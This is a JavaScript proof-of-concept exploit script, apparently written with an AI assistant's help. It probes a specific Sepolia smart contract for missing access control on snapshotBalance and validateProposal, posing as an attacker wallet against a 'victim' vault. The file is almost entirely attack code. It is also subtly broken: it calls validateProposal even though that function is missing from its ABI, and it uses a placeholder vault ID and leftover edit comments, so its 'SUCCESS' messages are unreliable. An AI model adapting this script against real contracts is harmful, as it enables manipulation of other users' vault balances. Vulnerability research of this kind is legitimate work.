const { ethers } = require("ethers");

// === EXPLOIT 4: REAL ON-CHAIN GOVERNANCE HIJACK VERIFICATION ===
// Target: Verified Contract on Sepolia
// Vulnerability: 'snapshotBalance' is public and permisionless.

const RPC_URL = "https://ethereum-sepolia.publicnode.com";
const CUSTODY_ADDRESS = "0x815aeca64a974297942d2bbf034bd63eb638883d"; // Verified Sepolia (Lowercase)

// We need a random wallet to prove "Anyone" can call it
const ATTACKER_PK = ethers.Wallet.createRandom().privateKey;

const ABI = [
    "function snapshotBalance(bytes32 _creator, address token) external",
    "function getVaults() external view returns (bytes32[])"
];

async function run() {
    console.log("=== VULNERABILITY 4: REAL ON-CHAIN TEST ===");

    // 1. Setup
    const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
    // We need a funded wallet to pay gas. 
    // Since I can't fund a random wallet easily, I will use the user's existing funded wallet if available, 
    // OR just use a 'callStatic' to simulate the transaction which PROVES it would succeed without spending gas.

    // Using callStatic is the smartest way to verify "It doesn't revert" without needing gas.
    const wallet = new ethers.Wallet(ATTACKER_PK, provider);
    const contract = new ethers.Contract(CUSTODY_ADDRESS, ABI, wallet);

    console.log("[*] Target Contract:", CUSTODY_ADDRESS);
    console.log("[*] Attacker:", wallet.address);

    // 2. Pick a Victim Vault
    // I'll generate a random Creator ID to verify I can snapshot *non-existent* vaults too (or existing ones)
    const victimCreator = ethers.utils.formatBytes32String("VictimUser");
    const fakeToken = "0x0000000000000000000000000000000000000001"; // Random address

    // The following code replaces the original try-catch block for snapshotBalance
    // It includes a new test for validateProposal and a modified test for snapshotBalance.
    const EXISTING_VAULT = ethers.utils.formatBytes32String("some_existing_vault_id"); // Placeholder, replace with actual if needed
    try {
        console.log("Simulating proposal validation...");
        await contract.callStatic.validateProposal(
            EXISTING_VAULT,
            ethers.utils.formatBytes32String("test_proposal"),
            { from: wallet.address }
        );
        console.log("\nSUCCESS: The call did NOT revert.");
        console.log("   (This means access control is likely missing or weak)\n");
    } catch (e) {
        console.log("\nFAILED:");
        console.log(`   ${e.reason || e.message}\n`);
    }

    try {
        const fakeToken = "0x0000000000000000000000000000000000000000";
        console.log("Simulating unauthorized balance snapshot...");

        // Try to trigger snapshotBalance on someone else's vault
        const victimCreator = ethers.utils.formatBytes32String("Victim");

        // If it throws "UPDATE_ERROR" or "REVERT", it FAILED.
        await contract.callStatic.snapshotBalance(victimCreator, fakeToken);

        console.log("\nSUCCESS: The call did NOT revert.");
        console.log("   Proof: Access Control is MISSING.");
        console.log("   Impact: Confirmed. Any user can manipulate balance history.");

    } catch (e) {
        console.log("\nFAILED:");
        if (e.code === 'CALL_EXCEPTION') {
            console.log("   The contract REVERTED. Access control might exist.");
            console.log("   Reason:", e.reason);
        } else {
            console.log("   Error:", e.message);
        }
    }
}

run();
